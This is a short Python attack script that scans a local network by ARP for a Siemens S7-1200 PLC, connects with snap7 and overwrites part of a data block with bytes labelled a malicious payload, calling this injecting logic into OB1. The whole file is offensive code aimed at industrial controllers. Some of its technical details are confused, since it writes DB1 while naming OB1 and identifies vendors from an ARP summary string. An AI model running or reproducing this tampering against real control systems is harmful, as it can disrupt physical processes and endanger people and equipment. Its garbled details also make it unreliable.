import snap7
from snap7.util import *
from snap7.types import *
import struct
from scapy.all import ARP, Ether, srp
import time

# Function to discover Siemens PLC in the network
def discover_plc_ip(target_network="192.168.1.0/24"):
    print("[*] Scanning network for Siemens S7-1200 PLC...")
    request = ARP(pdst=target_network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / request
    answered, _ = srp(packet, timeout=2, verbose=False)
    
    for sent, received in answered:
        if "Siemens" in received.summary():  # Check if it's a Siemens device
            print(f"[+] Siemens PLC found at IP: {received.psrc}")
            return received.psrc
    print("[-] No Siemens PLC found.")
    return None

# Function to modify execution flow by injecting malicious logic into OB1
def modify_ob1(plc_ip):
    plc = snap7.client.Client()
    
    try:
        print(f"[*] Connecting to PLC at {plc_ip}...")
        plc.connect(plc_ip, 0, 1)  # Rack 0, Slot 1 (default for S7-1200)
        
        if not plc.get_connected():
            print("[-] Failed to connect to PLC.")
            return
        
        print("[+] Connected to PLC.")

        # Read current OB1 block (DB1 for example purposes)
        data_block_number = 1  # Change if targeting different block
        size = 256  # Adjust based on expected OB1 size

        print("[*] Reading existing OB1 program...")
        ob1_data = plc.db_read(data_block_number, 0, size)

        # Inject new task (malicious logic)
        print("[*] Injecting new code into OB1...")
        malicious_payload = b"\x01\x02\x03\x04\xAA\xBB\xCC\xDD"  # Example malicious binary

        # Modify a selected portion of OB1 data
        for i in range(len(malicious_payload)):
            ob1_data[i] = malicious_payload[i]

        # Write modified logic back to PLC
        plc.db_write(data_block_number, 0, ob1_data)
        print("[+] OB1 modified successfully.")

    except Exception as e:
        print(f"[-] Error: {e}")
    
    finally:
        plc.disconnect()
        print("[*] Disconnected from PLC.")

# Main execution
if __name__ == "__main__":
    plc_ip = discover_plc_ip()
    if plc_ip:
        modify_ob1(plc_ip)